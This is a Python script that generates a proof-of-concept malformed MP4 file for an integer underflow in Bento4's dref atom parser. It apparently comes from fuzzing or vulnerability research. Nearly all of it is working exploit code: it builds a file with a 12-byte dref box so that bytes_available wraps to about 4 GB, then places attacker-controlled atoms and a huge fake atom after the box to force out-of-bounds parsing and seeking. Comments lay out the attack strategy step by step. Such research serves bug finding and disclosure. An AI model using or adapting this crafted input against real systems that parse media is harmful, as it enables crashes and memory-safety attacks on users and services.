#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Underflow in bytes_available in AP4_DrefAtom

Location: Ap4DrefAtom.cpp line 81
    AP4_LargeSize bytes_available = size - AP4_FULL_ATOM_HEADER_SIZE - 4;

AP4_FULL_ATOM_HEADER_SIZE = 12
When size = 12 (AP4_UI32):
    12 - 12 - 4 = 0xFFFFFFFC  (unsigned 32-bit wraps, then zero-extends to 64-bit)
    bytes_available = 0x00000000FFFFFFFC  (~4 GB)

The guard in Create() only checks: size >= AP4_FULL_ATOM_HEADER_SIZE (i.e. >= 12)
So size=12 passes the guard but then causes the underflow.

The inner while loop then calls CreateAtomFromStream with bytes_available ~= 4GB,
accepting any atom encountered in the stream, reading far beyond the dref boundary.

Attack strategy:
- Embed a dref box with size=12 inside a valid dinf box
- Place entry_count=1 and crafted atoms immediately after the 12-byte dref box
- The dref constructor reads entry_count from outside its boundary
- The inner while loop then parses our crafted atoms as dref children
- After our crafted atoms, the stream continues into the stbl box
  (out-of-bounds parsing)
- Use a large-size fake atom to cause CreateAtomFromStream to try a massive
  stream.Seek() or allocation that ASAN/UBSAN can detect.
"""

import struct
import os
import sys

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4DrefAtom_cpp"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")


def make_box(box_type, content=b''):
    """Create an MP4 box: 4-byte big-endian size + 4-byte type + content."""
    assert len(box_type) == 4, f"Box type must be 4 chars: {box_type!r}"
    size = len(content) + 8
    return struct.pack('>I', size) + box_type.encode('latin-1') + content


def make_full_box(box_type, version, flags, content=b''):
    """Create an MP4 full box (adds version + flags to make a 12-byte header)."""
    vf = struct.pack('>B', version) + struct.pack('>I', flags & 0xFFFFFF)[1:]
    return make_box(box_type, vf + content)


# ── ftyp ─────────────────────────────────────────────────────────────────────
ftyp = make_box('ftyp',
    b'isom'                         # major brand
    + struct.pack('>I', 0x00000200) # minor version
    + b'isom'                       # compatible brand
)

# ── mvhd (version=0) ─────────────────────────────────────────────────────────
#   size(4)+type(4)+ver/flags(4)+ctime(4)+mtime(4)+ts(4)+dur(4)
#   +rate(4)+vol(2)+res(10)+matrix(36)+predefined(24)+next_id(4) = 108 bytes
MATRIX_IDENTITY = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

mvhd_body = (
    struct.pack('>I', 0)          # creation_time
    + struct.pack('>I', 0)        # modification_time
    + struct.pack('>I', 1000)     # timescale
    + struct.pack('>I', 0)        # duration
    + struct.pack('>I', 0x00010000)  # rate  1.0
    + struct.pack('>H', 0x0100)   # volume 1.0
    + b'\x00' * 10                # reserved
    + MATRIX_IDENTITY             # 36 bytes
    + b'\x00' * 24                # pre_defined
    + struct.pack('>I', 2)        # next_track_ID
)
mvhd = make_full_box('mvhd', 0, 0, mvhd_body)

# ── tkhd (version=0, flags=3: enabled + in-movie) ────────────────────────────
tkhd_body = (
    struct.pack('>I', 0)          # creation_time
    + struct.pack('>I', 0)        # modification_time
    + struct.pack('>I', 1)        # track_ID
    + struct.pack('>I', 0)        # reserved
    + struct.pack('>I', 0)        # duration
    + b'\x00' * 8                 # reserved
    + struct.pack('>H', 0)        # layer
    + struct.pack('>H', 0)        # alternate_group
    + struct.pack('>H', 0x0100)   # volume 1.0
    + struct.pack('>H', 0)        # reserved
    + MATRIX_IDENTITY             # 36 bytes
    + struct.pack('>I', 0)        # width  (fixed-point 16.16)
    + struct.pack('>I', 0)        # height
)
tkhd = make_full_box('tkhd', 0, 3, tkhd_body)

# ── mdhd (version=0) ─────────────────────────────────────────────────────────
mdhd_body = (
    struct.pack('>I', 0)          # creation_time
    + struct.pack('>I', 0)        # modification_time
    + struct.pack('>I', 44100)    # timescale
    + struct.pack('>I', 0)        # duration
    + struct.pack('>H', 0x55C4)   # language = 'und'
    + struct.pack('>H', 0)        # pre_defined
)
mdhd = make_full_box('mdhd', 0, 0, mdhd_body)

# ── hdlr ─────────────────────────────────────────────────────────────────────
hdlr_body = (
    struct.pack('>I', 0)          # pre_defined
    + b'soun'                     # handler_type = sound
    + b'\x00' * 12               # reserved
    + b'\x00'                     # name (empty, null-terminated)
)
hdlr = make_full_box('hdlr', 0, 0, hdlr_body)

# ── smhd ─────────────────────────────────────────────────────────────────────
smhd = make_full_box('smhd', 0, 0,
    struct.pack('>H', 0)          # balance
    + struct.pack('>H', 0)        # reserved
)

# ── MALFORMED dref box (size=12 triggers the underflow) ──────────────────────
#
# Normal dref layout:
#   size(4) "dref"(4) version(1) flags(3) entry_count(4) [entries...]
#   = AP4_FULL_ATOM_HEADER_SIZE(12) + 4 bytes entry_count + entries
#
# Malicious dref: declare size=12, which means only the 12-byte full-atom
# header fits.  But AP4_DrefAtom::Create() accepts size>=12, so it proceeds.
# The constructor then reads entry_count from OUTSIDE the dref boundary,
# then computes:
#   bytes_available = 12 - AP4_FULL_ATOM_HEADER_SIZE - 4
#                   = 12 - 12 - 4
#                   = 0xFFFFFFFC  (unsigned 32-bit underflow)
#                 → 0x00000000FFFFFFFC as AP4_LargeSize (~4 GB)
#
# The inner while loop then runs with bytes_available ~= 4 GB, parsing atoms
# from beyond the dref box boundary.

malformed_dref = (
    struct.pack('>I', 12)         # size = 12  ← TRIGGER: underflow will happen
    + b'dref'                     # type
    + b'\x00'                     # version = 0
    + b'\x00\x00\x00'            # flags = 0
)
# Total: exactly 12 bytes.  NO entry_count field inside this box.

# ── Attacker-controlled bytes placed immediately after the malformed dref ─────
# These bytes are OUTSIDE the dref box's declared 12-byte boundary but will be
# consumed by the dref constructor and its parsing loop.

# 1. entry_count (4 bytes read by the constructor from outside dref boundary)
entry_count_bytes = struct.pack('>I', 1)   # entry_count = 1 → outer loop runs once

# 2. First "child" atom parsed by the inner while loop:
#    A url atom with size=12, self-contained flag → no URL body to read.
#    This will be successfully parsed and added to dref's children list.
url_atom_1 = (
    struct.pack('>I', 12)         # size
    + b'url '                     # type  (note trailing space)
    + b'\x00'                     # version
    + b'\x00\x00\x01'            # flags = 1 (self-contained, no URL)
)

# 3. Second "child" atom: large claimed size to trigger a huge stream.Seek()
#    and demonstrate out-of-bounds access attempt.
#    size = 0xFFFFFFE0 is just small enough to be <= bytes_available (0xFFFFFFFC)
#    so CreateAtomFromStream accepts it, then does stream.Seek(start+0xFFFFFFE0)
#    which seeks deep beyond the file, showing the OOB behavior.
fake_large_atom = (
    struct.pack('>I', 0xFFFFFFE0) # huge size (≈4 GB)
    + b'url '                     # type
    # No more bytes needed — CreateAtomFromStream checks size vs bytes_available
    # and then calls stream.Seek(start + size) which goes way beyond EOF.
)

# All attacker-controlled bytes that follow the malformed dref in the stream:
after_dref_bytes = entry_count_bytes + url_atom_1 + fake_large_atom

# ── dinf box ─────────────────────────────────────────────────────────────────
# dinf is a container; its declared content includes the malformed dref (12 B)
# plus our extra bytes (4+12+8 = 24 B), total content = 36 B.
# dinf size = 8 + 36 = 44 bytes.
dinf_content = malformed_dref + after_dref_bytes
dinf = make_box('dinf', dinf_content)

# ── stbl (minimal, required so mp42aac can continue parsing) ──────────────────
stsd = make_full_box('stsd', 0, 0, struct.pack('>I', 0))   # 0 entries
stts = make_full_box('stts', 0, 0, struct.pack('>I', 0))   # 0 time-to-sample entries
stsc = make_full_box('stsc', 0, 0, struct.pack('>I', 0))   # 0 sample-to-chunk entries
stsz = make_full_box('stsz', 0, 0,
    struct.pack('>I', 0)           # sample_size = 0 (variable)
    + struct.pack('>I', 0)         # sample_count = 0
)
stco = make_full_box('stco', 0, 0, struct.pack('>I', 0))   # 0 chunk offsets
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

# ── minf ─────────────────────────────────────────────────────────────────────
minf = make_box('minf', smhd + dinf + stbl)

# ── mdia ─────────────────────────────────────────────────────────────────────
mdia = make_box('mdia', mdhd + hdlr + minf)

# ── trak ─────────────────────────────────────────────────────────────────────
trak = make_box('trak', tkhd + mdia)

# ── moov ─────────────────────────────────────────────────────────────────────
moov = make_box('moov', mvhd + trak)

# ── mdat (empty placeholder) ─────────────────────────────────────────────────
mdat = make_box('mdat', b'')

# ── Assemble final MP4 ───────────────────────────────────────────────────────
mp4_data = ftyp + moov + mdat

os.makedirs(OUTPUT_DIR, exist_ok=True)
with open(OUTPUT_FILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Generated {len(mp4_data)} bytes -> {OUTPUT_FILE}")
print(f"[+] dref box at offset: {len(ftyp) + (len(moov) - len(trak) - 8 - len(mvhd)) + 8 + len(tkhd) + 8 + len(mdhd) + len(hdlr) + 8 + len(smhd) + 8}")
print(f"[+] dref box size field: 12 (should trigger underflow)")
print(f"[+] bytes_available after underflow: 0x{(12 - 12 - 4) & 0xFFFFFFFF:08X} "
      f"(= {(12 - 12 - 4) & 0xFFFFFFFF} as AP4_LargeSize)")
print(f"[+] entry_count placed outside dref boundary: 1")
print(f"[+] Large fake atom (size=0xFFFFFFE0) placed after url atom")
print(f"[!] Expected: dref inner while loop reads atoms beyond dref boundary")
print(f"[!] Expected: large atom triggers out-of-bounds stream.Seek()")
